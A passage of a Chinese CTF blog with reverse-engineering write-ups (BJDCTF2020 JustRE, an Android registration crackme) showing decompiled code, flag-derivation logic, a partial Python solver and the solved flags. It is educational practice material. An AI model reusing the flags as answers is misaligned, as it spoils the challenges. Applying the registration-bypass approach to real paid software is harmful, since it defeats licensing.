<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">34</span> <span class="token operator">=</span> <span class="token number">51</span> <span class="token operator">+</span> <span class="token number">34</span> <span class="token operator">=</span> <span class="token number">86</span> <span class="token operator">=</span> <span class="token char">' U '</span></pre></td></tr><tr><td data-num="2"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">' J '</span></pre></td></tr><tr><td data-num="3"></td><td><pre>v4 <span class="token operator">=</span> <span class="token string">"ak1w"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>v5 <span class="token operator">=</span> <span class="token string">"V1Ax"</span></pre></td></tr></table></figure><p>通过 base64 解码得到</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>v4 <span class="token operator">=</span><span class="token char">'jMp'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>v5 <span class="token operator">=</span><span class="token char">'WP1'</span></pre></td></tr></table></figure><p>而 v4 依次表示 String [5]，String [6]，String [7]，v5 依次表示 String [2]，String [3]，String [4]</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328184603221.png" alt="image-20220328184603221" /></p>
<p>因此可知：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'U'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'J'</span></pre></td></tr><tr><td data-num="3"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'W'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'P'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'1'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'j'</span></pre></td></tr><tr><td data-num="7"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'M'</span></pre></td></tr><tr><td data-num="8"></td><td><pre>String<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'p'</span></pre></td></tr></table></figure><p>这样我们就得到我们的 flag 啦！！！</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>UJWP1jMp<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="bjdctf2020justre"><a class="anchor" href="#bjdctf2020justre">#</a> [BJDCTF2020]JustRE</h2>
<p>得到的 flag 请包上 flag {} 提交。来源：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JqZHNlY0NBL0JKRENURjIwMjA=">https://github.com/BjdsecCA/BJDCTF2020</span></p>
<p>附件运行：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330191244930.png" alt="image-20220330191244930" /></p>
<p>getflag：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330191302892.png" alt="image-20220330191302892" /></p>
<p>点击几次：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330191324259.png" alt="image-20220330191324259" /></p>
<p>about：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330191343128.png" alt="image-20220330191343128" /></p>
<p>查壳，无壳且 32 位</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330191446454.png" alt="image-20220330191446454" /></p>
<p>ida 打开主函数结构</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330191632267.png" alt="image-20220330191632267" /></p>
<p>没发现什么奇怪的地方，f5 反编译如下</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __stdcall <span class="token function">WinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nShowCmd<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  HACCEL AcceleratorsA<span class="token punctuation">;</span> <span class="token comment">// esi</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">struct</span> <span class="token class-name">tagMSG</span> Msg<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-1Ch] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">LoadStringA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token number">0x67u</span><span class="token punctuation">,</span> WindowName<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">LoadStringA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token number">0x6Du</span><span class="token punctuation">,</span> ClassName<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">sub_4010C0</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  result <span class="token operator">=</span> <span class="token function">sub_401150</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> nShowCmd<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    AcceleratorsA <span class="token operator">=</span> <span class="token function">LoadAcceleratorsA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x6D</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">GetMessageA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">TranslateAcceleratorA</span><span class="token punctuation">(</span>Msg<span class="token punctuation">.</span>hwnd<span class="token punctuation">,</span> AcceleratorsA<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">TranslateMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token function">DispatchMessageA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">return</span> Msg<span class="token punctuation">.</span>wParam<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330191716980.png" alt="image-20220330191716980" /></p>
<p>挨个点进查看也没有发现什么奇怪的地方，最后在这发现了一个类似于 flag 的字符串</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>BJD<span class="token punctuation">&#123;</span><span class="token string">'%d%d'</span>2069a45792d233ac<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330192047066.png" alt="image-20220330192047066" /></p>
<p>双击跟进，找到主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330192333269.png" alt="image-20220330192333269" /></p>
<p>再跟进</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330192455290.png" alt="image-20220330192455290" /></p>
<p>f5 反编译如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>INT_PTR __stdcall <span class="token function">DialogFunc</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT a2<span class="token punctuation">,</span> WPARAM a3<span class="token punctuation">,</span> LPARAM a4<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  CHAR String<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-64h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">272</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">273</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Format<span class="token punctuation">,</span> <span class="token operator">++</span>dword_4099F0<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_4099F0 <span class="token operator">==</span> <span class="token number">19999</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">" BJD&#123;'%d%d'2069a45792d233ac&#125;"</span><span class="token punctuation">,</span> <span class="token number">19999</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">EndDialog</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330192514576.png" alt="image-20220330192514576" /></p>
<p>可以看到在 14 行输出了字符串 <code>BJD&#123;'%d%d'2069a45792d233ac&#125;, 19999, 0</code></p>
<p>而 BJD 这串字符串也是因为前两个字符串没有输出导致不完整，不妨猜测 <code>19999，0</code>  就是前两个字符串</p>
<p>所以这串疑似 flag 的字符串，完整型如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>BJD<span class="token punctuation">&#123;</span><span class="token number">1999902069</span>a45792d233ac<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>据此，不妨猜测我们的 flag 就是：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span><span class="token number">1999902069</span>a45792d233ac<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>提交成功！</p>
<p><strong>注</strong>：由于博客主题设置影响两个 % d 会隐藏后面的博文，因此小编在这里对其进行添加单引号注解 <code>'%d%d'</code></p>
<h2 id="findit"><a class="anchor" href="#findit">#</a> findit</h2>
<p>不知不觉，小明长大了，变成了一个程序员，虽然很苦逼，但是偶尔编写个小东西坑害公司新人还是蛮好玩的。新人小萌一天问小明 wifi 账号密码，一分钟后，小萌收到了一个文件。小萌想了好久都没得到密码，怎么办，女朋友要买东西，流量告罄，没 wifi 上不了网，不买就分手，是时候该展现月老的实力了兄弟们！代表月亮惩罚小明！得出答案。 注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件没了 emmm</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331194055502.png" alt="image-20220331194055502" /></p>
<h2 id="简单注册器"><a class="anchor" href="#简单注册器">#</a> 简单注册器</h2>
<p>生活中难免会有需要使用一些付费的程序，但是没有绿色版怎么办？只能自己逆向看看注册程序的代码是什么逻辑了。 注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件下载.apk 文件，用 apk-ide 打开</p>
<p>在 MainActivity$1.smali 文件中有可疑字符串</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331195002861.png" alt="image-20220331195002861" /></p>
<p>新问题就是这个 java 编译的代码并不是很能看懂，于是去网上百度后发现一个反编的神器<span class="exturl" data-url="aHR0cHM6Ly9kb3duLjUycG9qaWUuY24vVG9vbHMvQW5kcm9pZF9Ub29scy9KRUJfMy4wLjAuMjAxODA4MDMxOTQ4X1Byby56aXA="> JEB</span></p>
<p>用 JEB 反编译 apk 文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331200142714.png" alt="image-20220331200142714" /></p>
<p>字符串查找 flag</p>
<p>发现可疑 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331200922990.png" alt="image-20220331200922990" /></p>
<p>右键 jump</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331200948097.png" alt="image-20220331200948097" /></p>
<p>再按 tab 进行反编译</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331201010366.png" alt="image-20220331201010366" /></p>
<p>可以发现 flag 就是字符串 <code>dd2940c04462b4dd7c450528835cca15</code>  经过一系列变化得到</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>public <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span>View arg13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>                <span class="token keyword">int</span> v11 <span class="token operator">=</span> <span class="token number">0x1F</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>                <span class="token keyword">int</span> v9 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>                <span class="token keyword">int</span> v2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                String v6 <span class="token operator">=</span> this<span class="token punctuation">.</span>val$editview<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>                <span class="token keyword">if</span><span class="token punctuation">(</span>v6<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x20</span> <span class="token operator">||</span> v6<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">97</span> <span class="token operator">||</span> v6<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">98</span> <span class="token operator">||</span> v6<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> v6<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x30</span> <span class="token operator">!=</span> <span class="token number">56</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                    v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>                <span class="token keyword">if</span><span class="token punctuation">(</span>v2 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>                    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> v5 <span class="token operator">=</span> <span class="token string">"dd2940c04462b4dd7c450528835cca15"</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>                    v5<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                    v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                    v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                    v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>                    <span class="token keyword">int</span> v4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                    <span class="token keyword">for</span><span class="token punctuation">(</span>v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> v4 <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>v4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                        <span class="token keyword">char</span> v0 <span class="token operator">=</span> v5<span class="token punctuation">[</span><span class="token number">0x1F</span> <span class="token operator">-</span> v4<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                        v5<span class="token punctuation">[</span><span class="token number">0x1F</span> <span class="token operator">-</span> v4<span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                        v5<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>                    this<span class="token punctuation">.</span>val$textview<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span> <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                    this<span class="token punctuation">.</span>val$textview<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"输入注册码错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>编写 python 代码进行执行</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0x1F</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token 